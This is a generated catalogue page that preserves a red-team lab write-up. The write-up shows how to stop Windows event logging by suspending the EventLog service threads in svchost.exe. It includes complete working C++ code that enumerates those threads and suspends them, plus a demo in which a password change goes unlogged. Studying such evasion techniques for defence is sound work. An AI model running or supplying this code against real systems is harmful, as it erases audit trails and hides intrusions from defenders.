---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Disabling Windows Event Logs by Suspending EventLog Service Threads

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-disabling-windows-event-logs-by-suspending-eventlog-service-threads` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Disabling Windows Event Logs by Suspending EventLog Service Threads](../../topics/offensive-security/disabling-windows-event-logs-by-suspending-eventlog-service-threads.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-disabling-windows-event-logs-by-suspending-eventlog-service-threads |
| name | Disabling Windows Event Logs by Suspending EventLog Service Threads |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads.md |

## Preserved Source Material

````yaml
_asset_filenames:
- demo-suspending-eventlog-threads (1).gif
- image (618).png
- image (620).png
- image (621).png
- image (622).png
- suspended-threads-no-events (1).gif
_body: "# Disabling Windows Event Logs by Suspending EventLog Service Threads\n\nThis lab was inspired by an old post [Phant0m:\
  \ Killing Windows Event Log](https://artofpwn.com/phant0m-killing-windows-event-log.html) by [@hlldz](https://twitter.com/hlldz)\
  \ where he introduced a powershell tool [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m), which disables Windows\
  \ EventLog service by killing its threads hosted by the svchost.exe.\n\nThe purpose of this quick lab is to understand some\
  \ of the inner workings of Invoke-Phant0m. In particular, I wanted to play around with Windows APIs related to retrieving\
  \ a process ID that hosts a given service, thread enumeration, mapping threads to a particular service (Windows Eventlog\
  \ in this case) hosted in the svchost.exe and so on. This would give me a better understanding of how I can target specific\
  \ threads when I need to, I thought.\n\n{% hint style=\"info\" %}\nAlthough this lab was inspired by @hlldz' post, you will\
  \ notice that we implemented the same technique in a slightly different way by levarging different Windows APIs.\n{% endhint\
  \ %}\n\n## Overview\n\nWindows event logs are handled by `EventLog` service that is hosted by svchost.exe.\n\nIf we list\
  \ svchost processes, we see a number of those:\n\n![](<../../.gitbook/assets/image (618).png>)\n\nFrom the above screenshot,\
  \ it's not clear which process actually hosts the `EventLog` service, but if we keep inspecting `svchost.exe` processes\
  \ one by one in Process Hacker, we will eventually find the process hosting the `EventLog` service, which in my case it\
  \ is `svchost.exe` with pid 2196:\n\n![](<../../.gitbook/assets/image (620).png>)\n\nNote that we can find out the PID of\
  \ the process that is hosting `EventLog`:\n\n```csharp\nGet-WmiObject -Class win32_service -Filter \"name = 'eventlog'\"\
  \ | select -exp ProcessId\n```\n\n![](<../../.gitbook/assets/image (621).png>)\n\nIf we look into svchost.exe threads for\
  \ `EventLog`, we see there are a couple of threads of interest as highlighted in blue:\n\n![](<../../.gitbook/assets/image\
  \ (622).png>)\n\nBelow shows that indeed, suspending the threas is enough to disable the EventLog service from registering\
  \ any new events:\n\n![](<../../.gitbook/assets/suspended-threads-no-events (1).gif>)\n\nBased on the above, the main goal\
  \ of this lab is to hack some code to find these threads and simply suspend them and disable windows event logging this\
  \ way.\n\n{% hint style=\"warning\" %}\nResuming threads will write out the events to the events log as if the threads had\
  \ not been suspended in the first place.\n{% endhint %}\n\n## Code\n\nBelow is the code for the technique that at a high\
  \ level works like this:\n\n1. Open a handle to Service Control Manager with `OpenSCManagerA`\n2. Open a handle to EventLog\
  \ service with `OpenServiceA`\n3. Retrieve svchost.exe (hosting EventLog) process ID with `QueryServiceStatusEx`\n4. Open\
  \ a handle to the svchost.exe process (from step 3)\n5. Get a list of loaded modules loaded by svchost.exe `EnumProcessModules`\n\
  6. Loop through the list of `svchost` loaded modules, retrieved in step 5, find their names with `GetModuleBaseName` and\
  \ find the base address of the module `wevtsvc.dll` - this is the module containing `EventLog` service inner-workings\n\
  7. Get `wevtsvc.dll` module info with `GetModuleInformation`. It will return a structure with module's start address and\
  \ its image size - we will need these details later, when determiing if `EventLog` service thread's fall into wevtsvc.dll\
  \ module's memory space\n8. Enumerate all the threads inside svchost.exe with `Thread32First` and `Thread32Next`\n9. For\
  \ each thread from step 8, retrieve the thread's start address with `NtQueryInformationThread`\n10. For each thread from\
  \ step 8, check if the thread's start address belongs to the `wevtsvc.dll` memory space inside svchost.exe\n11. If thread's\
  \ start address is inside the `wevtsvc.dll` memory space, this is our victim thread and we suspend it with `SuspendThread`\n\
  12. `EventLog` service is now disabled\n\n```cpp\n#include <iostream>\n#include <Windows.h>\n#include <Psapi.h>\n#include\
  \ <TlHelp32.h>\n#include <dbghelp.h>\n#include <winternl.h>\n\n#pragma comment(lib, \"DbgHelp\")\n\nusing myNtQueryInformationThread\
  \ = NTSTATUS(NTAPI*)(\n\tIN HANDLE          ThreadHandle,\n\tIN THREADINFOCLASS ThreadInformationClass,\n\tOUT PVOID   \
  \       ThreadInformation,\n\tIN ULONG           ThreadInformationLength,\n\tOUT PULONG         ReturnLength\n\t);\n\nint\
  \ main()\n{\n\tHANDLE serviceProcessHandle;\n\tHANDLE snapshotHandle;\n\tHANDLE threadHandle;\n\n\tHMODULE modules[256]\
  \ = {};\n\tSIZE_T modulesSize = sizeof(modules);\n\tDWORD modulesSizeNeeded = 0;\n\tDWORD moduleNameSize = 0;\n\tSIZE_T\
  \ modulesCount = 0;\n\tWCHAR remoteModuleName[128] = {};\n\tHMODULE serviceModule = NULL;\n\tMODULEINFO serviceModuleInfo\
  \ = {};\n\tDWORD_PTR threadStartAddress = 0;\n\tDWORD bytesNeeded = 0;\n\n\tmyNtQueryInformationThread NtQueryInformationThread\
  \ = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtQueryInformationThread\"));\n\n\tTHREADENTRY32\
  \ threadEntry;\n\tthreadEntry.dwSize = sizeof(THREADENTRY32);\n\n\tSC_HANDLE sc = OpenSCManagerA(\".\", NULL, MAXIMUM_ALLOWED);\n\
  \tSC_HANDLE service = OpenServiceA(sc, \"EventLog\", MAXIMUM_ALLOWED);\n\n\tSERVICE_STATUS_PROCESS serviceStatusProcess\
  \ = {};\n\n\t# Get PID of svchost.exe that hosts EventLog service\n\tQueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,\
  \ (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);\n\tDWORD servicePID = serviceStatusProcess.dwProcessId;\n\
  \n\t# Open handle to the svchost.exe\n\tserviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);\n\tsnapshotHandle\
  \ = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n\n\t# Get a list of modules loaded by svchost.exe\n\tEnumProcessModules(serviceProcessHandle,\
  \ modules, modulesSize, &modulesSizeNeeded);\n\tmodulesCount = modulesSizeNeeded / sizeof(HMODULE);\n\tfor (size_t i = 0;\
  \ i < modulesCount; i++)\n\t{\n\t\tserviceModule = modules[i];\n\n\t\t# Get loaded module's name\n\t\tGetModuleBaseName(serviceProcessHandle,\
  \ serviceModule, remoteModuleName, sizeof(remoteModuleName));\n\n\t\tif (wcscmp(remoteModuleName, L\"wevtsvc.dll\") == 0)\n\
  \t\t{\n\t\t\tprintf(\"Windows EventLog module %S at %p\\n\\n\", remoteModuleName, serviceModule);\n\t\t\tGetModuleInformation(serviceProcessHandle,\
  \ serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));\n\t\t}\n\t}\n\n\t# Enumerate threads\n\tThread32First(snapshotHandle,\
  \ &threadEntry);\n\twhile (Thread32Next(snapshotHandle, &threadEntry))\n\t{\n\t\tif (threadEntry.th32OwnerProcessID == servicePID)\n\
  \t\t{\n\t\t\tthreadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);\n\t\t\tNtQueryInformationThread(threadHandle,\
  \ (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);\n\t\t\t\n\t\t\t# Check if thread's start address\
  \ is inside wevtsvc.dll memory range\n\t\t\tif (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress\
  \ <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)\n\t\t\t{\n\t\t\t\tprintf(\"Suspending EventLog\
  \ thread %d with start address %p\\n\", threadEntry.th32ThreadID, threadStartAddress);\n\n\t\t\t\t# Suspend EventLog service\
  \ thread\n\t\t\t\tSuspendThread(threadHandle);\n\t\t\t\tSleep(2000);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn 0;\n}\n```\n\n## Demo\n\
  \nBelow GIF illustrates:\n\n* `net user ola ola` is executed and user's ola password is changed and an event `4724` logged\
  \ at 6:55:30 PM\n* 4 EventLog threads are suspended in svchost.exe (PID 2196)\n* `net user ola ola` is executed again at\
  \ 6:55:38 PM, but no new event `4724` is captured\n\n![](<../../.gitbook/assets/demo-suspending-eventlog-threads (1).gif>)\n\
  \n## References\n\n{% embed url=\"https://artofpwn.com/phant0m-killing-windows-event-log.html\" %}"
_relative_path: offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads.md
````
